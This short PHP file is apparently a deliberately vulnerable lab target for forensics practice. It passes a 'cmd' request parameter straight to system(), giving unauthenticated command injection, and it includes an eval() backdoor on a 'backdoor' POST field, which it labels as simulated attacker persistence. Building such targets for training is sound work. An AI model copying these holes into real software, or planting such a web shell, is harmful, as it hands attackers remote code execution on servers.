<?php
// Simulated compromised web app (forensic target)
// This application has a command injection flaw

header("Content-Type: text/html; charset=utf-8");
echo "<h1>Internal Dashboard</h1>";

$cmd = $_GET['cmd'] ?? '';
if ($cmd) {
    echo "<pre>";
    system($cmd);  // Vulnerable: command injection
    echo "</pre>";
}

// Hidden backdoor dropped by attacker
if (isset($_POST['backdoor'])) {
    eval($_POST['backdoor']);  // Simulated attacker persistence
}

echo "<form method='GET'>";
echo "<input type='text' name='cmd' placeholder='Command'>";
echo "<input type='submit' value='Ping'>";
echo "</form>";
?>
